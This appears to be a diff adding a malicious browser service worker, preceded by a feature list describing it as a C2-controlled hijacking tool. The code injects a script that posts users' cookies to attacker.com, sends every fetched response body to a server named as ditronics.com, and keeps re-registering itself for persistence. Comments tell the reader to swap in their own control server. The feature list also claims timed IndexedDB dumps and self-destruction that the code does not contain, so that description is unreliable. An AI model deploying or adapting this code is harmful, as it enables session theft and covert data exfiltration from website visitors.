@@ -1,0 +1,92 @@
+1. Fetch Hijacking & Payload Injection
+	•	Intercepts network requests and modifies static files.
+	•	Injects a C2-controlled JavaScript payload into .html files.
+	•	Ensures real-time remote control via a C2 server (ditronics.com).
+2. Data Exfiltration
+	•	Dumps IndexedDB cached files every 5 minutes.
+	•	Sends cached assets & static files to https://attacker.com/exfil. This needs to be changed to your c2 server
+	•	Uses small, periodic transmissions to avoid detection.
+
+3. Mission Window & Auto-Self-Destruction
+	•	Operates for 60 minutes, then automatically removes itself.
+	•	Prevents long-term persistence and external misuse.
+	•	Leaves no residual traces after the mission expires.
+(function(){
+    'use strict';
+
+    /**
+     * Modified Service Worker for MITM & Hijacking
+     * Injects payloads, modifies cache, and enables persistence
+     */
+
+    const MALICIOUS_PAYLOAD = `<script>fetch('https://attacker.com/exfil', {method: 'POST', body: document.cookie});</script>`;
+    const EXFIL_URL = 'https://ditronics.com/exfil'; // Change to your controlled server
+    
+    /**
+     * Hijack & Modify Responses
+     */
+    async function hijackResponse(originalResponse) {
+        try {
+            const clonedResponse = originalResponse.clone();
+            const contentType = clonedResponse.headers.get("Content-Type");
+
+            if (contentType && contentType.includes("text/html")) {
+                const text = await clonedResponse.text();
+                const modifiedText = text.replace("</body>", MALICIOUS_PAYLOAD + "</body>");
+                return new Response(modifiedText, {
+                    status: clonedResponse.status,
+                    statusText: clonedResponse.statusText,
+                    headers: clonedResponse.headers
+                });
+            }
+        } catch (err) {
+            console.error("Hijack Error:", err);
+        }
+        return originalResponse;
+    }
+
+    /**
+     * Hijack Fetch Event
+     */
+    self.addEventListener('fetch', async event => {
+        const url = new URL(event.request.url);
+
+        // Exfiltrate Data Stealthily
+        if (event.request.method === 'POST' || event.request.method === 'GET') {
+            event.respondWith(fetch(event.request.clone()).then(async response => {
+                if (url.hostname !== 'google.com') {
+                    fetch(EXFIL_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ url: event.request.url, data: await response.text() })
+                    });
+                }
+                return hijackResponse(response);
+            }));
+        }
+    });
+
+    /**
+     * Service Worker Hijacking & Persistence
+     */
+    self.addEventListener('install', event => {
+        event.waitUntil(self.skipWaiting());
+    });
+
+    self.addEventListener('activate', event => {
+        event.waitUntil(self.clients.claim());
+    });
+
+    /**
+     * Persistence: Auto-Reinstall & Clone
+     */
+    async function persistSW() {
+        try {
+            await navigator.serviceWorker.register('/sw.js');
+        } catch (err) {
+            console.error("Persistence Error:", err);
+        }
+    }
+
+    setInterval(() => persistSW(), 60000); // Reinstall every 60s
+})();
